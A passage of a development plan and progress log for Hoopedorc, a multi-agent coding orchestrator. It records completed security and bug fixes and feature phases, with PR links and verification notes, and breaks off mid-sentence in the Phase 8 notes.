# Productization Plan + Bug/Security Fix List

**Audience: the implementing model.** This doc was produced by a full read of
the codebase (all of `packages/*` and `apps/web`) plus the existing docs (PRD,
ARCHITECTURE, NEXT_STEPS, CONTRACT). It is an evolving evidence archive; later
parts were appended after the original ten:

- **Part 1 — Fix first**: real bugs and security issues found in the current code,
  ordered by severity, each with a concrete fix. Do these before any Part 2 feature.
- **Part 2 — Productization features**: what to build to turn this into a polished,
  robust product for developers who hold multiple model subscriptions and want to run
  coding agents in parallel (autonomous runs, remote updates, mid-run intervention).
- **Part 3 — Review-pass fixes & next features** (added 2026-07-05 after Parts 1–2
  completed, from an independent audit of the merged code by a second model): five
  fixes for defects the audit confirmed in the shipped Phase 6 work, then a second
  feature wave. Same rules, same workflow. Fable will re-verify each item after it
  merges, so keep verification evidence in the PR descriptions.
- **Part 4 — Post-plan audit & UX wave** (added 2026-07-06 after Part 3 completed):
  the audit record for the merged Phase 7/8 work (three integration fixes, already
  landed as PR #57), then a UX improvement wave (U1–U10) produced by walking every
  page of the real app in a browser. Completed 2026-07-06.
- **Part 5 — Post-UX-wave fixes & remote-QoL wave** (added 2026-07-07 after Part 4
  completed, from Fable's audit of the merged U1–U10 code plus a review of the app
  against the target deployment: the server on an EC2 instance inside the owner's
  Tailscale tailnet, planned and supervised from any device — often a phone —
  running near-autonomously): six fixes for defects/footguns confirmed in the
  current code, then a quality-of-life wave aimed at that remote deployment.
  Completed 2026-07-07.
- **Part 6 — Owner-requested QoL wave + Phase 10 audit fixes** (added 2026-07-07
  after Part 5 completed, from Fable's audit of the merged Phase 10 code plus
  eight new quality-of-life requests from the owner): three small fixes
  confirmed against the current code/docs, then a feature wave centered on
  planning-context uploads (attachments + archived plan-chat sessions),
  documentation quality (real guidelines for the docs-role model and a per-task
  documentation step in the merge pipeline), engineering-standards prompts for
  authors and validators, rate-limit resilience with Telegram alerts, an honest
  model round-trip test, and a skills strategy. Also picks up two leftovers
  Parts 4–5 deliberately deferred: the `@orc/server` test package and quota
  usage in the health panel. Completed 2026-07-08.
- **Part 7 — Codex + agents-context + sandbox wave** (added 2026-07-08 after
  Part 6 completed, from Fable's audit of the merged Phase 11 code, a full
  design-critique walkthrough of the running app, and four owner decisions:
  Codex CLI as an interchangeable alternative to Claude Code — the owner has
  a ChatGPT Plus/Pro subscription; gates-only sandbox THIS wave — the EC2
  deploy target is Linux, which dissolves the macOS-Keychain blocker F13 was
  deferred over; EC2 runs web/extension projects while Apple/Xcode projects
  stay on the local Mac; and the usual split of Fable specs → Sonnet
  implements → Fable re-verifies): one referential-integrity fix confirmed
  against the current code, four small UX items from the critique, then the
  wave — a native Codex runner, a swappable planner, AGENTS.md generation in
  the planning pipeline, the long-deferred gates-only Docker sandbox, and an
  EC2 deploy checklist, plus B29 (a stale-dependency-fingerprint bug found
  live-verifying F36). The owner deploys to EC2 right after this wave.
  Completed 2026-07-09.
- **Part 8 — Remote-supervision wave** (added 2026-07-09 after Part 7
  completed and Fable's Phase 12 audit found no defects; the owner deploys
  to EC2 while this wave is built): one efficiency fix confirmed by tracing
  the restart path (a task that was only waiting for a human tap re-runs
  from scratch after a restart), then the Telegram command wave the owner
  asked for — switch merge policy from the phone, list/re-send pending
  approvals, stop-all, retry, digest control, health summary — plus an
  optional hold-dispatch-while-awaiting-approval mode, an EC2 bootstrap
  script, and the missing sandbox-mode UI toggle. Completed 2026-07-10.
- **Part 9 — Autonomy-hardening wave** (added 2026-07-14 from the owner's
  first real dogfooding runs on the EC2 box): every item traces back to a
  failure or safety gap the owner hit live — a confirmed parser bug that
  breaks deconstruction whenever the plan text contains code fences, the
  autonomous run silently ending when a model hits its cooldown/quota
  window, no rail at all against destructive changes under
  `fully_autonomous`, "author produced no changes" failures with no
  diagnosis of where the agent actually wrote, missing web notifications
  for fallback/requeue events, the opencode-runner rejection in the
  planner now that model routing exists, and planner-output hardening
  (flat task DAG, scope paths that cover shared wiring files).
- **Part 10 — Reliability, portability, and mobile-control wave** (added
  2026-07-14 after an independent Codex audit of the complete v0.6.0 codebase
  and the owner's follow-up decisions): fixes the remaining execution-ownership,
  process-cancellation, rollback, gate-safety, credential-boundary, runtime-
  settings, dependency-cache, durability, accounting, and shutdown gaps; adds
  per-model effort, portable project setup, Telegram hardening, frontend tests,
  and a full responsive pass. The EC2 instance remains the Linux/web scheduled-
  run host and a separate Hoopedorc installation on the owner's Mac handles
  Xcode/Apple projects. Multi-host delegation is explicitly out of scope.
- **Part 11 — Contributor workflow and remote self-update** (added
  2026-07-16 after the first EC2 dogfooding cycle): adds the concise
  contributor guide and a fail-closed UI-triggered updater that survives the
  serving service's restart. Implementation is complete; its real EC2 update
  smoke remains separately tracked.
- **Part 12 — Focused context handoff and Figma fidelity** (approved
  2026-07-23 after reviewing the actual repository against a broader draft):
  keeps the existing planning/orchestration architecture, adds lean
  task-reference handoff, verifies exact Figma screen nodes through whichever
  selected runner is configured, makes capability failures recoverable, and
  adds one automatic visual-QA task through the existing DAG/gate/validator
  pipeline. Full design: `docs/HOOPEDORC_CONTEXT_INTAKE_UPGRADE.md`.

**Ground rules for every change:**
- `main` is sacred: branch → PR → merge. Keep `npm run typecheck`, `npm run build`,
  `npm test -w @orc/engine`, `npm test -w @orc/server`, and
  `npm test -w @orc/adapters` green on every PR.
- The contract is `@orc/types`. If you add/change a route or type, update
  `packages/types/src/api.ts` (+ `ROUTES`), `docs/CONTRACT.md`, and the mock server.
- Work top of this list downward. Each item states files and acceptance criteria —
  verify the criteria before moving on.

---

## Progress

Tracks completion against the **Suggested execution order** table at the bottom of
this doc. Update this section (and re-check the acceptance criteria) as each phase
lands — this is the single place to see what's done vs. still open.

### Phase 1 — S1, S2, S3, S4 (injection/exposure holes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| S1 — Command injection via `execSync` | ✅ done | [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3) |
| S2 — Unauthenticated API, open CORS | ✅ done | [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4) |
| S3 — Telegram bot token in plaintext | ✅ done | [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5) |
| S4 — `rm -rf` on arbitrary path | ✅ done | [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge. Notable follow-on additions made
while implementing this phase (not separate plan items, but relevant to later work):
- `Settings.apiToken` + a shared `SECRET_SENTINEL` (`@orc/types`) — the mechanism S3
  needed for Telegram-token redaction, generalized so S2's new `apiToken` secret uses
  it too. Reuse this sentinel for any future secret field.
- The web client (`apps/web/src/api/client.ts`) now stores a bearer token in
  `localStorage` and prompts once on a 401; this is a stopgap, not the polished
  onboarding UI — F1 should replace the `window.prompt()` with a real login step.

### Phase 2 — B1, B2, B3, B4, B5 (control-plane bugs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B1 — Stop didn't stop the running agent | ✅ done | [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8) |
| B2 — Log history dead after reload (`runId: ""`) | ✅ done | [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9) |
| B3 — Manual dispatch vs. autonomous loop double-run | ✅ done | [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10) |
| B4 — Run rows only written at run end | ✅ done | [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11) |
| B5 — Unvalidated `PATCH /api/tasks/:id` status | ✅ done | [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12) |

All five merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge (new engine unit tests added for
B1's stop mechanism and B4's live run row). B1, B3, and B4 were also verified live
against the real (non-mock) server — B4's live-run-row fix was confirmed with real
paid model calls (`GET /api/tasks/:id/runs` showing a genuine in-flight `"running"`
row with correct non-zero durations once terminal). Notable follow-on additions:
- `TASK_STATUSES` (`@orc/types/domain.ts`) is now the single source of truth for
  the `TaskStatus` union — reused by both the server's PATCH validation (B5) and
  the Board's column list, so they can't drift apart.
- `EngineRunner.manualRuns` (added for B3) also closed a gap B1 had flagged: `stopTask`
  can now reach a manually-dispatched task's own one-off orchestrator, not just the
  autonomous-loop one.
- The Board has no "Stop" button yet — B1 is backend-only (verified via the API);
  F3 (Part 2) is where the UI button gets wired up.

### Phase 3 — S5, B6–B15 (hygiene + rails) — ✅ DONE

Split into two batches (quick independent fixes first, then the meatier ones):

| Item | Status | PR |
|---|---|---|
| B6 — `in_review` status never set | ✅ done | [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14) |
| B8 — Telegram Markdown metachar failures | ✅ done | [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15) |
| B12 — Risky-file regex false positives | ✅ done | [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16) |
| B13 — `scopesOverlap` mishandles globs | ✅ done | [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17) |
| B14 — Unbounded `logs` table growth | ✅ done | [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18) |
| B11 — Gates pass vacuously, no scripts | ✅ done | [#20](https://github.com/IngeniousArtist/hoopedorc/pull/20) |
| S5 — Sanitized env for spawned agents | ✅ done | [#21](https://github.com/IngeniousArtist/hoopedorc/pull/21) |
| B7 — Planner argv E2BIG risk | ✅ done | [#22](https://github.com/IngeniousArtist/hoopedorc/pull/22) |
| B9 — Mid-run task additions invisible | ✅ done | [#23](https://github.com/IngeniousArtist/hoopedorc/pull/23) |
| B10 — Zombie approvals after restart | ✅ done | [#24](https://github.com/IngeniousArtist/hoopedorc/pull/24) |
| B15 — WS broadcasts cross-project | ✅ done | [#25](https://github.com/IngeniousArtist/hoopedorc/pull/25) |

Batch 1 (B6, B8, B12, B13, B14) merged first; `npm run typecheck`,
`npm run build`, and `npm test -w @orc/engine` green as of each merge (10/10
tests, 4 new). B6, B12, and B13 verified with new unit tests; B6 additionally
live-verified with real model calls (`in_progress → in_review → in_progress`
on a gate-failure retry, observed via `GET /api/tasks/:id` on a throwaway
repo); B8 verified with a scripted `fetch` double (no Telegram bot available);
B14 live-verified against the real server (seeded an old/oversized DB, booted,
confirmed the exact row counts pruned). Notable finds:
- B13 surfaced a **second, previously-latent bug** while fixing the first:
  `Orchestrator.start()`'s dispatch loop computed `activeScopePaths` once per
  while-iteration and never updated it as tasks were dispatched within the
  same pass — masked until B13's `scopesOverlap` fix made it observable via a
  failing integration test. Both are fixed in PR #17.
- `isAuthOrSecretFile` and `scopesOverlap`/`staticScopePrefix` (B12, B13) are
  now exported from `orchestrator.ts` specifically so they're directly unit
  testable — a pattern worth continuing for future pure-logic fixes in this
  file.

Batch 2 (B11, S5, B7, B9, B10, B15) all merged to `main`; `npm run typecheck`,
`npm run build`, `npm test -w @orc/engine` (13/13, 3 new), and
`npm test -w @orc/adapters` (2/2, new — the package had no test script before
S5) green as of each merge. B11 and B9 verified with new unit tests; S5
verified with new unit tests plus reasoning about real CLI/gate-script
behavior; B7's stdin-vs-argv switch was live-verified directly against the
installed `claude`/`opencode` CLIs (piped stdin genuinely used as the prompt,
not ignored) rather than through the full seed-e2e harness; B10 and B15 were
both live-verified against the real (non-mock) server — B10 by seeding a
zombie approval and confirming the boot-time expiry + 410 response; B15 by
subscribing three raw WS clients to different projects and confirming a
`task.updated` broadcast only reached the one subscribed to the matching
project. Notable finds/decisions:
- B11 fixed the root cause too, not just the symptom: appended a standing
  instruction to the planner's deconstruct prompt so a brand-new project's
  first scaffold task sets up real `test`/`build`/`lint`/`typecheck` scripts,
  instead of only detecting the vacuous-gate state after the fact.
- B9's fix replaced the older single-task `SchedulerDeps.getTask` refresh
  hook entirely with a broader `getTasks` reconciliation run at the top of
  every loop pass — one mechanism now covers both "new task appeared" and
  "a known task's fields changed," including `status` (which the old hook
  never adopted).
- B15 required adding `projectId` to `Run`/`LogEvent`/`MergeDecision` (a
  schema migration via the existing `ALTER TABLE` list in `db/index.ts`) since
  those three `ServerEvent` payloads were the only ones that didn't already
  carry one.
- Did not add a Board warning banner for B11's vacuous-gate case — the web
  app has no plumbing yet to surface `GateResult`/`MergeDecision` per task at
  all; that's squarely F2's "Review tab" scope.

### Phase 4 — F1, F2, F3, F4 (core product loop) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F1 — First-run onboarding wizard | ✅ done | [#27](https://github.com/IngeniousArtist/hoopedorc/pull/27) |
| F2 — Task detail drawer | ✅ done | [#28](https://github.com/IngeniousArtist/hoopedorc/pull/28) |
| F3 — Mid-run control | ✅ done | [#29](https://github.com/IngeniousArtist/hoopedorc/pull/29) |
| F4 — Live mission control strip | ✅ done | [#30](https://github.com/IngeniousArtist/hoopedorc/pull/30) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` (14/14, 1 new) green as of each merge. Every item was
live-verified in a real browser against a real (non-mock) server seeded
directly via SQLite for the specific scenario each feature needed (empty DB
for F1's onboarding gate; a task with real runs + merge decisions for F2's
tabs; a running project + an in-flight task for F3's stop/add-task/pause
controls; active tasks + budget + a pending approval for F4's strip) — not
just typechecked. Notable finds/decisions:
- F1: extracted `RoutingEditor` out of `Settings.tsx` into a shared component
  (now used by both Settings and the wizard) instead of duplicating ~110
  lines; added a new `GET /api/setup/models` endpoint (shells `opencode
  models`) so the model-mapping step offers a real datalist instead of a
  blind text field.
- F2: `LogPanel.tsx` was repurposed into just the log list (no outer
  fixed-shell/close-button) since `TaskDrawer` now owns that shell across all
  four tabs. New `GET /api/tasks/:id/decisions` route — the repo function
  (`getMergeDecisions`) already existed, just wasn't wired to a route.
- F3: "Reprioritize via drag" needed zero new code — the Board's existing
  generic drag-and-drop plus B5's PATCH validation already implemented it.
  New `Orchestrator.pause(project, { drain? })`: drain mode forces the
  dispatch loop's `ready` list empty instead of aborting, letting active
  tasks finish naturally; `EngineRunner.pause` only removes the orchestrator
  from its map for the non-drain case, so a second Start can't race in while
  a drain is still finishing. Live testing caught and fixed a real bug: the
  Stop confirm/toast text said "requeued to backlog" but the actual behavior
  is "moved to Blocked".
- F4: reused `TaskCard`'s `Heartbeat`/`agoLabel` (now exported) instead of
  duplicating elapsed-time formatting; `Board.tsx`'s existing `costAnalytics`
  fetch already returned `budgetUsd`, just wasn't being read — no new
  request needed for the budget bar.

### Phase 5 — F5, F6, F7, F8 (away-from-keyboard autonomy) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F5 — Notifications that reach the user | ✅ done | [#32](https://github.com/IngeniousArtist/hoopedorc/pull/32) |
| F6 — Model health + subscription awareness | ✅ done | [#33](https://github.com/IngeniousArtist/hoopedorc/pull/33) |
| F7 — Cost guardrails short of the hard stop | ✅ done | [#34](https://github.com/IngeniousArtist/hoopedorc/pull/34) |
| F8 — Autonomous-run report card | ✅ done | [#35](https://github.com/IngeniousArtist/hoopedorc/pull/35) |

All four merged to `main`; `npm run typecheck`, `npm run build`,
`npm test -w @orc/engine` (15/15, 1 new), and `npm test -w @orc/adapters`
(4/4, 2 new) green as of each merge. UI-touching pieces were live-verified in
a real browser against a real (non-mock) server seeded directly via SQLite;
server-only logic (cooldown skip, budget-threshold gating, run-summary
computation) was verified with standalone scripts that boot a real
`EngineRunner`/`Orchestrator` against a real in-memory SQLite DB and reach
private methods via `as any` — exercising actual production code paths, not
reimplementations. Notable finds/decisions:
- F5: `Settings.telegram.digest` (`"off" | "terminal" | "all"`) gates task
  status pushes independent of the always-unconditional audit entry and
  always-sent approval requests. New `ApprovalContext` (PR url + top
  validator reasons) enriches the Telegram approval message. New
  `useBrowserNotify` context wraps the Notifications API — only fires while
  the tab is hidden, so it doesn't nag an already-focused window.
- F6: adapters classify a failed run's `exitReason` as `"rate_limited"` (new
  `classifyFailure`, regex against the failure summary) instead of the
  generic `"error"`; `EngineRunner` tracks a cross-project in-memory
  cooldown map keyed by model, consulted via a new
  `SchedulerDeps.checkModelCooldown` hook at dispatch time — mirrors
  `checkBudget` exactly (skip, don't fail, warn once). New `model_checks`
  table persists "Test models" results so the new SetupView health panel's
  "last check" column survives a reload; failure rate + median duration come
  from the existing `runs` table (median computed in JS — SQLite has no
  `MEDIAN` aggregate).
- F7: new `budget_alerts` table (unique on `scope, threshold`) makes the
  50%/80% warnings fire exactly once each; the global scope's key bakes in
  the calendar month (`global:2026-07`) so a new month re-arms both
  thresholds without any explicit reset, matching how the global budget
  itself is month-scoped. Raising a project's budget cap also clears its
  recorded alerts, so crossing 80% once doesn't permanently silence future
  warnings. The per-task estimate chip reused the `estimate.ts`/
  `GET /api/projects/:id/estimate` machinery that already existed but was
  unused by the Board. The "budget bar turns amber/red" ask needed zero new
  code — F4's `MissionControl` already covered it.
- F8: report cards are scoped to one autonomous-loop start-to-finish cycle
  (`ts >= runStartedAt` against the audit log), not the project's lifetime
  totals — a new `repo.getCostSince` made that precise. Persisted as a
  `run_summary`-kind audit entry; `AuditView` separates those out into a
  dedicated "Run Reports" section instead of mixing them into the
  chronological list. Skipped the plan's optional "pipe through the
  updates-role model for natural language" toggle — explicitly optional, and
  the plan itself says the mechanical digest must not depend on a model.

### Phase 6 — F9, F10, F11, F12 (flexibility, packaging, docs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F9 — Project templates & per-project gate config | ✅ done | [#37](https://github.com/IngeniousArtist/hoopedorc/pull/37) |
| F10 — Packaging & deployment | ✅ done | [#38](https://github.com/IngeniousArtist/hoopedorc/pull/38) |
| F11 — Docs for other users | ✅ done | [#39](https://github.com/IngeniousArtist/hoopedorc/pull/39) |
| F12 — Multi-project run queue | ✅ done | [#40](https://github.com/IngeniousArtist/hoopedorc/pull/40) |

All four merged to `main`; `npm run typecheck`/`npm run build` green
across every workspace as of each merge. **This closes out Phase 6 — every
item in Part 1 (security/bugs) and Part 2 (product features) of this plan
is now done.** F12: `ModelConfig.maxConcurrent` was only ever enforced
per-`Orchestrator`-instance, so two concurrently-running projects could
each dispatch `maxConcurrent` copies of the same model at once — new
optional `SchedulerDeps.getModelActive`/`incModelActive`/`decModelActive`
hooks let `EngineRunner.buildOrchestrator` wire every project's Orchestrator
to ONE shared counter instead (falls back to a local per-instance count
when the hooks are absent, e.g. unit tests). Writing the test for this
surfaced a real correctness gap the change introduced: the dispatch loop's
"nothing dispatched, nothing of mine active → wind down" exit condition
assumed a blocked task could only be freed by this orchestrator's own
activity — with a shared cap, it can now be freed by a *different*
project's task finishing, so a new `blockedByCapacity` flag makes that
specific case poll-and-retry instead of prematurely ending the run.
`ProjectsView` also gained inline Start/Pause per row (previously
read-only). Verified: `npm test -w @orc/engine` 21/21 (1 new, proving two
separate Orchestrator instances sharing an injected registry actually
serialize dispatch of a capped model); the real `EngineRunner` wiring
itself (not just Orchestrator logic) was live-verified via a standalone
script reaching `buildOrchestrator` for two different real projects and
confirming their deps share one counter; the Projects-page buttons'
underlying routes were live-verified via curl. Browser screenshot
verification was attempted for both F11 and F12's UI pieces but the Chrome
extension tool errored at the frame level across several attempts
(confirmed via curl that the dev servers themselves served fine) — noted
rather than claimed.

F11 merged to `main`; `npm run typecheck`/`npm run build` (`@orc/web`)
green. New `docs/USER_GUIDE.md` covers what it is, install/prereqs (which
subscription each specialist model needs, `opencode auth login`), a
first-project tutorial, the safety model, remote Tailscale setup, and a
troubleshooting table drawn from real failure modes hit during development
(the historic PWD/worktree bug, `opencode`'s "database is locked"
collision-retry, vacuous gates, a misconfigured self-review validator, and
F10's Keychain/Docker auth caveat). Linked from the README and the app's
Setup page. Browser live-verification was attempted but the Chrome
extension tool errored at the frame level regardless of URL (confirmed via
curl that the dev server itself served fine) — for this one, a single
external link with no new logic, typecheck+build+code review stood in for
a screenshot.

F10 merged to `main`; `npm run typecheck`/`npm run build` green,
`npm test -w @orc/engine` (20/20) / `-w @orc/adapters` (4/4) unaffected. The
server now serves the built web app itself (`@fastify/static` on
`apps/web/dist`, no-op until that directory exists so `npm run dev` is
unaffected) with a SPA-style fallback to `index.html` for unmatched non-API
paths — live-verified against the real built `dist/index.js`, not just
source. New root `npm run start`/`npm run setup` (`scripts/init.mjs`) and a
`hoopedorc` CLI (`bin/hoopedorc.mjs`); `npm run setup` was run for real
(created `.env`, all three CLI checks passed). `deploy/` holds a systemd
unit (the primary supported path) plus a reference Dockerfile/compose —
writing the Docker auth caveats surfaced a real, verified fact worth
remembering: **Claude Code's login lives in the macOS Keychain**, which a
Linux container cannot access at all (mountable or not); the documented
workaround is `ANTHROPIC_API_KEY` (confirmed via `claude --help`'s `--bare`
mode), which bills per-token via the Console rather than a Pro/Max
subscription's flat rate. The Docker path itself was **not** built/run
against a live daemon (none available in this environment) — it's a
documented starting point, not a verified recipe. New `CHANGELOG.md`
(retroactive entries per phase) + README updates.

F9 merged to `main`; `npm run typecheck`, `npm run build`, `npm test -w
@orc/engine` (20/20, 5 new), and `npm test -w @orc/adapters` (4/4) green.
New `Project.config` (`ProjectConfig`) holds per-project gate script
overrides (or `false` to skip a gate), a free-form `testCommand` for
non-npm stacks (execFile, no shell), a `maxAttempts` default for tasks
created in that project, and a `mergePolicy` override — all optional, so an
unset project behaves exactly as before. `GateRunnerImpl` reads
`project.config.gates` directly (it already receives `project` via
`.run(project, task)`, so no `SchedulerDeps.gateConfig` plumbing was needed
— a deliberate simplification vs. the plan's original wording);
`canAutoMerge` resolves `project.config?.mergePolicy` before falling back to
`Settings.mergePolicy`. New shared `ProjectConfigFields` "Advanced" accordion
used by both `NewProject` (create) and `ProjectHeader` (post-creation edit,
budget-row-style dirty-check + save). Live-verified against a real
(non-mock) server via curl + sqlite3: config round-trips on create/GET,
invalid values 400, PATCH updates/null-clears it, maxAttempts default
applies correctly with and without an override, and an old pre-F9 DB
migrates cleanly. Notable find: writing real (non-mocked) tests for the
gate overrides surfaced a genuine pre-existing bug in B11's vacuous-gate
detection — `npm run <script> --if-present` exits 0 whether or not the
script exists, so the old `ran` flag (inferred from a thrown error) was
silently always `true` on success in every real repo, only ever
"working" in mocked tests. Fixed by checking `package.json` directly
(`hasNpmScript`) instead of inferring presence from npm's exit behavior.

### Phase 7 — B16–B19, S6 (review-pass fixes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B16 — Dockerfile build stage certainly fails (missing COPYs) | ✅ done | [#42](https://github.com/IngeniousArtist/hoopedorc/pull/42) |
| B17 — Configured-but-missing gate script silently passes | ✅ done | [#43](https://github.com/IngeniousArtist/hoopedorc/pull/43) |
| B18 — Capacity-blocked project waits silently | ✅ done | [#44](https://github.com/IngeniousArtist/hoopedorc/pull/44) |
| B19 — Manual dispatch invisible to the global model cap | ✅ done | [#45](https://github.com/IngeniousArtist/hoopedorc/pull/45) |
| S6 — Auth polish: real login screen, constant-time compare, doc note | ✅ done | [#46](https://github.com/IngeniousArtist/hoopedorc/pull/46) |

B16 fixed: `deploy/Dockerfile`'s build stage now copies `tsconfig.base.json`,
`bin/`, and `scripts/` before `npm ci` (every workspace tsconfig extends the
root base config, and the root `package.json` declares a `bin` entry +
`setup` script pointing at those paths, so both were required for `npm ci`
and `npm run build` to succeed). No Docker daemon available in this
environment — verified by replicating the exact post-fix `COPY` set
(`package*.json`, `tsconfig.base.json`, `bin/`, `scripts/`, `packages/`,
`apps/`, excluding gitignored `node_modules`/`dist` to match what a real
build context from a git checkout would contain) into a fresh temp dir and
running `npm ci && npm run build` there — both succeeded.

B17 fixed: `gate-runner.ts`'s `runGate()` and `runTestsGate()`'s `testScript`
branch now check `hasNpmScript` for an explicit override *before* delegating
to `runScript`, returning a hard `passed: false` with a
`configured gate script "<name>" not found in package.json` message when the
named script doesn't exist — mirrors `runCommand`'s existing reasoning for
`testCommand` (operator-configured means failures are real, not "nothing to
run"). The default-slot path (no override) is untouched: `runScript`'s own
internal `hasNpmScript` check still returns `{ passed: true, ran: false }`
for a repo with no default `typecheck`/`lint`/`build`/`test` scripts, which
is exactly the B11 vacuous-gate signal. Three new `gate-runner.test.ts`
cases cover all three acceptance scenarios (typecheck override missing →
fails loudly; testScript override missing → fails the tests gate loudly;
default-slot missing script with no override → still passes vacuously) —
24/24 engine tests green (3 new).

B18 fixed: `orchestrator.ts` gained a `capacityBlockedWarned` Set that
mirrors `budgetBlockedWarned`/`cooldownBlockedWarned` exactly — cleared in
`start()`, one `"warn"`-level log ("Model at capacity (in use by another
task or project), holding: `<model>`") emitted the first time the
`active >= cfg.maxConcurrent` skip fires for a task, and deleted from the
set right where the task actually dispatches (mirroring the budget/cooldown
delete-on-dispatch pattern). Previously the F12 capacity skip was the only
one of the three dispatch-blocking checks with no log line at all — with a
shared cross-project cap, a project could sit polling for minutes on
another project's model slot looking indistinguishable from a hang. New
unit test: pre-load a shared registry already at `maxConcurrent`, let the
250ms poll loop run several passes (600ms), confirm exactly one capacity
warn log fires (not one per poll), then free the slot and confirm the task
dispatches and completes. 25/25 engine tests green (1 new).

B19 fixed: `runTask()` (the `/dispatch` manual-run path) now calls
`this.incModel(task.assignedModel)` and `this.runningModel.set(task.id, ...)`
before `executeTask`, and its `finally` mirrors `start()`'s dispatch-finally
exactly — decrement whichever model the task last ran on (fallback
escalation may have switched it), then clear `runningModel`/`activeTaskIds`.
Deliberately does **not** add a capacity *check* to `runTask`: a manual
dispatch is a human's explicit action and must never be silently
capacity-blocked, but until this fix it was invisible to the shared F12
registry, so the autonomous loop (or another project) could pile
`maxConcurrent` *more* copies of the same model on top of it. Updated the
stale `manualRuns` doc-comment in `engine-runner.ts`, which previously
stated manual runs "never contribute to that count" — they now do (the
capacity check is still skipped, only the counting changed). New unit test:
a manually-dispatched task and a second `Orchestrator`'s autonomous-loop
task share a registry and both target a `maxConcurrent: 1` model — asserts
their author adapter calls never overlap (`maxConcurrentAuthors === 1`) and
both finish `done`. As documented in the plan, left the known escalation
transient-overshoot case alone (fallback escalation increments the next
model without a capacity check — blocking mid-task risks deadlock, so a
brief overshoot is the accepted tradeoff). 26/26 engine tests green (1 new).

S6 fixed (all three leftovers): **(1) Login screen.** New
`apps/web/src/components/TokenGate.tsx` — a small centered card, rendered by
`App.tsx` only when `client.ts`'s new `setUnauthorizedHandler` callback
fires (i.e. only after a real 401; auth-off, the default, never trips it).
`client.ts` replaced the old blocking browser-prompt stopgap with
`export function setUnauthorizedHandler(h)`; on 401 it awaits the handler,
stores what it resolves with, and retries once. `TokenGate` validates the
entered token itself — a raw `fetch(apiUrl("getSettings"))` with the
candidate token, bypassing `api()` to avoid recursing back into the 401
handler — so by the time it resolves the outer promise the token is already
confirmed-good, and it shows an inline "Incorrect token." error and stays
open on a bad guess instead of closing and surfacing a generic error
elsewhere. `useWS.ts` needed no changes: it already reads
`getStoredApiToken()` fresh on every reconnect attempt (verified by reading
the code, then confirming live — see below). `grep -r` for the old prompt
mechanism (matched as a literal string) now returns nothing under
`apps/web/src`. **(2) Constant-time compare.** New `safeTokenEqual()` in
`index.ts`'s auth hook uses `node:crypto`'s `timingSafeEqual` on UTF-8
buffers with a length-mismatch guard first (since `timingSafeEqual` throws
rather than returning `false` on unequal lengths); applied to both the
bearer-header and `?token=` query-param checks. **(3) Docs.** New paragraph
in `USER_GUIDE.md`'s Remote setup section: the SPA shell (`/`, JS, CSS) is
served without a token even when `API_TOKEN` is set — only `/api/*` and the
WebSocket upgrade are gated — by design (the shell has no data in it), but
worth knowing since anyone reaching the port can see Hoopedorc is running
there. Live-verified end-to-end against a real (non-mock) server with
`API_TOKEN` set, using `agent-browser` against the actual built
`apps/web/dist` (F10's static-serving path, not the Vite dev server): fresh
page load (cleared `localStorage`) showed the in-app TokenGate with no
native browser dialog; submitting a wrong token showed the inline
"Incorrect token." error and the gate stayed open (screenshotted); a
followup fresh page load after clearing `localStorage` and setting a stale
bogus token confirmed the gate is skipped entirely when the server has no
`API_TOKEN` configured, regardless of leftover `localStorage` content;
submitting the correct token closed the gate and loaded the full Board with
live mock data. Server request logs confirm the WebSocket path specifically:
an unauthenticated `GET /ws` attempt was rejected `401` before the token was
entered, then subsequent `GET /ws?token=...` upgrade attempts after
authenticating were **not** 401'd (no rejection logged for any of them),
proving the socket itself authenticated — not just the REST calls. Also
curl-verified the constant-time compare's observable behavior directly: no
token → 401, wrong token → 401, correct token → 200, `/api/health` and the
SPA shell → 200 unauthenticated in all cases. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(26/26) and `-w @orc/adapters` (4/4) unaffected (`@orc/server` has no test
package of its own — live verification is the bar for server-only changes
here, matching precedent from S2's original auth-hook work).

### Phase 8 — F14–F19 (user opted in to F19 too) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F14 — CI for this repo (GitHub Actions) | ✅ done | [#48](https://github.com/IngeniousArtist/hoopedorc/pull/48) |
| F15 — "Wait for GitHub checks" merge gate | ✅ done | [#51](https://github.com/IngeniousArtist/hoopedorc/pull/51) |
| F16 — Subscription quota awareness | ✅ done | [#52](https://github.com/IngeniousArtist/hoopedorc/pull/52) |
| F17 — DB backup rotation | ✅ done | [#53](https://github.com/IngeniousArtist/hoopedorc/pull/53) |
| F18 — Sandbox design doc (docs only) | ✅ done | [#54](https://github.com/IngeniousArtist/hoopedorc/pull/54) |
| F19 — Scheduled runs (previously optional — user explicitly asked for it after Phase 7, so it's in scope; do after F14-F17) | ✅ done | [#55](https://github.com/IngeniousArtist/hoopedorc/pull/55) |

F14 fixed: new `.github/workflows/ci.yml` runs on every PR and push to
`main` — checkout, `setup-node@v4` (node 22, npm cache), `npm ci`,
`npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
`npm test -w @orc/adapters`. No Docker build step, no secrets needed. The
very first CI run immediately found a real, previously-invisible bug:
`npm run typecheck` failed everywhere with "Cannot find module '@orc/types'"
because `@orc/types`/`@orc/adapters`/`@orc/engine` all resolve their
